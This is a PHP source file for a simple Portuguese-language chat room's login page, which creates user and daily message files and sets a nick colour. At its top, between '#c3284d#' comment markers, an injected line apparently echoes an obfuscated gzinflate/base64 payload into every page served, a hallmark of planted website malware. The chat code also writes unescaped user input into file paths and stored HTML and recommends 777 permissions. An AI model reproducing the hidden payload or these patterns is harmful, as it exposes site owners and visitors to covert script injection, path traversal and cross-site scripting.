<?php
session_start("chat");

#c3284d#
echo(gzinflate(base64_decode("JY5BDsIgFET3TXoH8jfqpiQuFXoKL/AFBJQCgV/R20vtbvKSNzOiquIzMfpmI4HMh/gT37hTmMdBJ7UuJtLUiidzPAj/KLgYVouS4IjyhfOMzmJ71UmlhevUYkioeSWkOmWXgcVuSLg1T2QKsN6eQvDRSsCVErB/5T0VbYqE2AEGb6ME1Yc3wRlvHUk4A2tek9vSLPh+ZT6cruMg+P55/gE=")));
#/c3284d#
?>
<?php
/*
======================================
     phillippimenta@gmail.com        =
                                     ==========================================================
      Sistema de Bate-Papo           = DESENVOLVIDO POR: PHILLIP PIMENTA                      =
                                     ==========================================================
      http://www.phpedia.net         =
======================================

Instalação

- Da a permissão 777 nas pastas mensagens e usuarios.
- Depois é só rodar no servidor
*/
?>
<html>
<head>
<title>Bate-Papo</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>
<body >
<?php
$nick = $_POST['nick'];$cor  = $_POST['cor'];$sala = date("dmY");
if(file_exists("usuarios")){}else{if(mkdir("usuarios", 0777)){}else{echo"Erro!";}}
if(file_exists("mensagens/$sala.txt")){}else
{
$criar = fopen("mensagens/$sala.txt", "w");
$permissao = chmod("mensagens/$sala.txt", 0777);
$abrir = fopen("mensagens/$sala.txt","w");
fwrite($abrir,"0");
fclose($abrir);
}
$arquivo = fopen("mensagens/$sala.txt","r");
$while = fread($arquivo,filesize("mensagens/$sala.txt"));
fclose($arquivo);
if($_POST['acao'] == "Ok")
{
if(empty($nick)){echo("<script>alert(\"Digite um Nick!\");</script>");}
elseif(file_exists("usuarios/$nick.txt")){echo("<script>alert(\"Usuário já existente!\");</script>");}
else{
$criar = fopen("usuarios/$nick.txt" , "w");
fwrite($criar,"Todos");
fclose($criar);
$hora = date("H:i:s");
if($while == "0"){$perm = "w";}else{$perm = "a+";}
$abrir = fopen("mensagens/$sala.txt","$perm");
$salvar = "<font face=verdana size=1>($hora)</font> <font face=verdana size=2 color=$cor>$nick</font> <font face=verdana size=2>entra na sala...</font><br>";
fwrite($abrir,"$salvar");
fclose($abrir);
$vc = $_POST['nick'];
session_register("vc","cor");
echo"<script>window.location='sala.php';</script>";
}
}
?>
<form name="form" method="post">
<font size="7" face="Courier" color="#660066">Bate-Papo</font><br><br>
<font face="Verdana" size="2">Digite seu Nick:</font><br>
<input type="text" name="nick" size="20"> <input type="submit" value="Ok" name="acao"><br>
<font face="Verdana" size="2">Cor do Nick:</font><br>
<select style="WIDTH: 100" name="cor">
<option value="#000000">Preto</option>
<option value="#ff0000" style="color:#ff0000;">Vermelho</option>
<option value="#996633" style="color:#996633;">Marrom</option>
<option value="#008000" style="color:#008000;">Verde</option>
<option value="#0099FF" style="color:#0099FF;">Azul</option>
<option value="#FF6600" style="color:#FF6600;">Laranja</option>
<option value="#FF00FF" style="color:#FF00FF;">Rosa</option>
<option value="#660066" style="color:#660066;">Roxo</option>
</select><br>
</form>
</body>
</html>
